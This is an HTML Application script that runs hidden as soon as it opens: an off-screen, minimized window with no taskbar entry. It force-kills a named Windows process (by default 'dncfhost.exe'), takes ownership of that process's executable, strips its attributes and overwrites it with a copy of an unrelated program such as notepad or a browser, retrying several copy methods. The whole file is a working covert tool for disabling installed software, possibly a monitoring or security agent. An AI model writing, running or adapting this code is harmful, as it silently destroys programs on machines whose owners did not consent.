<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION
    ID="SD"
    APPLICATIONNAME="SD"
    BORDER="none"
    BORDERSTYLE="none"
    CAPTION="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
/>
<title></title>
<style>
body { margin: 0; padding: 0; background: transparent; }
</style>
</head>
<body>
<script type="text/vbscript">
Function GetProcessByName(pn)
    On Error Resume Next
    Dim o, c, p, f
    f = False
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        f = True
        Exit For
    Next
    GetProcessByName = f
End Function

Function GetProcessPath(pn)
    On Error Resume Next
    Dim o, c, p
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        If Not IsNull(p.ExecutablePath) Then
            GetProcessPath = p.ExecutablePath
            Exit Function
        End If
    Next
    GetProcessPath = ""
End Function

Function ForceKillProcess(pn)
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "taskkill /F /IM " & pn, 0, True
End Function

Function RemoveAttributes(path)
    On Error Resume Next
    Dim fso, f
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(path) Then
        Set f = fso.GetFile(path)
        f.Attributes = 0
    End If
End Function

Function TakeOwnership(path)
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.Run "takeown /F """ & path & """", 0, True
End Function

Function BinaryCopyADODB(sf, tf)
    On Error Resume Next
    Dim a, b
    Set a = CreateObject("ADODB.Stream")
    a.Type = 1
    a.Open
    a.LoadFromFile sf
    b = a.Read
    a.Close
    a.Open
    a.Type = 1
    a.Write b
    a.SaveToFile tf, 2
    a.Close
    BinaryCopyADODB = (Err.Number = 0)
End Function

Function BinaryCopyFSO(sf, tf)
    On Error Resume Next
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.CopyFile sf, tf, True
    BinaryCopyFSO = (Err.Number = 0)
End Function

Function BinaryCopyCMD(sf, tf)
    On Error Resume Next
    Dim sh, fso
    Set sh = CreateObject("WScript.Shell")
    sh.Run "cmd /c copy /Y /B """ & sf & """ """ & tf & """", 0, True
    Set fso = CreateObject("Scripting.FileSystemObject")
    BinaryCopyCMD = fso.FileExists(tf)
End Function

Function FindRecursive(folder, fn)
    On Error Resume Next
    Dim fso, f, sf, result
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FolderExists(folder) Then
        FindRecursive = ""
        Exit Function
    End If
    
    Set f = fso.GetFolder(folder)
    
    If fso.FileExists(fso.BuildPath(folder, fn)) Then
        FindRecursive = fso.BuildPath(folder, fn)
        Exit Function
    End If
    
    Dim depth
    depth = Len(folder) - Len(Replace(folder, "\", ""))
    
    If depth < 5 Then
        For Each sf in f.SubFolders
            result = FindRecursive(sf.Path, fn)
            If result <> "" Then
                FindRecursive = result
                Exit Function
            End If
        Next
    End If
    
    FindRecursive = ""
End Function
</script>
<script type="text/javascript">
window.resizeTo(1,1);
window.moveTo(-2000,-2000);

function sleep(ms) {
    return new Promise(function(resolve) {
        window.setTimeout(resolve, ms);
    });
}

function getTargetProcess() {
    try {
        var w = new ActiveXObject("WScript.Shell");
        var e = w.Environment("Process");
        var c = e("CMDLINE");
        var m = c.match(/--name\s+(\S+)/i);
        if (m) return m[1];
    } catch(x) {}
    return "dncfhost.exe";
}

function findSource() {
    var sh = new ActiveXObject("WScript.Shell");
    
    var targets = [
        "Spotify.exe", "Discord.exe", "Teams.exe", "Slack.exe", "Skype.exe",
        "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe",
        "Code.exe", "Telegram.exe", "WhatsApp.exe", "Zoom.exe", "Steam.exe",
        "EpicGamesLauncher.exe", "Origin.exe", "Battle.net.exe", "vlc.exe",
        "7zFM.exe", "WinRAR.exe", "notepad.exe", "calc.exe", "mspaint.exe"
    ];
    
    var paths = [
        sh.ExpandEnvironmentStrings("%APPDATA%"),
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%"),
        sh.ExpandEnvironmentStrings("%PROGRAMFILES%"),
        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%"),
        "C:\\Windows\\System32"
    ];
    
    for (var i = 0; i < targets.length; i++) {
        for (var j = 0; j < paths.length; j++) {
            try {
                var result = FindRecursive(paths[j], targets[i]);
                if (result && result !== "") return result;
            } catch(e) {}
        }
    }
    
    return "C:\\Windows\\System32\\notepad.exe";
}

async function killProcessWithRetry(pn, maxRetries) {
    for (var retry = 0; retry < maxRetries; retry++) {
        ForceKillProcess(pn);
        await sleep(5000);
        
        if (!GetProcessByName(pn)) {
            return true;
        }
    }
    return false;
}

async function replaceWithRetry(sf, tf, maxRetries) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var targetSize = fso.GetFile(sf).Size;
    
    for (var retry = 0; retry < maxRetries; retry++) {
        TakeOwnership(tf);
        await sleep(300);
        RemoveAttributes(tf);
        await sleep(300);
        
        // Metodo 1: ADODB Stream
        if (BinaryCopyADODB(sf, tf)) {
            await sleep(500);
            if (fso.FileExists(tf) && fso.GetFile(tf).Size === targetSize) {
                return true;
            }
        }
        
        await sleep(300);
        
        // Metodo 2: FSO CopyFile
        if (BinaryCopyFSO(sf, tf)) {
            await sleep(500);
            if (fso.FileExists(tf) && fso.GetFile(tf).Size === targetSize) {
                return true;
            }
        }
        
        await sleep(300);
        
        // Metodo 3: CMD copy /B (binary)
        if (BinaryCopyCMD(sf, tf)) {
            await sleep(500);
            if (fso.FileExists(tf) && fso.GetFile(tf).Size === targetSize) {
                return true;
            }
        }
        
        // Se tutti i metodi falliscono, aspetta 5 secondi prima del prossimo retry
        if (retry < maxRetries - 1) {
            await sleep(5000);
        }
    }
    
    return false;
}

async function execute() {
    var pn = getTargetProcess();
    var tf = GetProcessPath(pn);
    
    if (!tf || tf === "") {
        window.close();
        return;
    }
    
    var sf = findSource();
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    if (!fso.FileExists(sf) || !fso.FileExists(tf)) {
        window.close();
        return;
    }
    
    // STEP 1: Kill process (max 5 retry, 5 secondi tra ogni retry)
    var killed = await killProcessWithRetry(pn, 5);
    
    if (!killed) {
        await sleep(1000);
    }
    
    // STEP 2: Replace (max 5 retry, ogni retry prova tutti i 3 metodi)
    var replaced = await replaceWithRetry(sf, tf, 5);
    
    await sleep(1000);
    window.close();
}

window.onload = function() {
    window.setTimeout(function() { 
        execute().catch(function(e) {
            window.setTimeout(function() {
                window.close();
            }, 1000);
        });
    }, 500);
};
</script>
</body>
</html>
